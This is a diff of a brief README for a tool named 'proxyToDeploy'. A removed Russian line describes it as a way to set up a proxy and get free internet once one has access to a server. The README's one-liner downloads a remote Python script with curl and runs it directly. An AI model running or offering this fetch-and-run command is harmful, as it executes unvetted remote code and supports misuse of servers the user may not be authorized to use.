@@ -1,5 +1,5 @@
 # proxyToDeploy
-Это чтобы прокинуть прокси и юзать бесплатный инет если получил доступ к серверу
+эт мне надо
 ```
 python -c "$(curl https://raw.githubusercontent.com/88VLRX88/proxyToDeploy/main/server.py)"
 ```
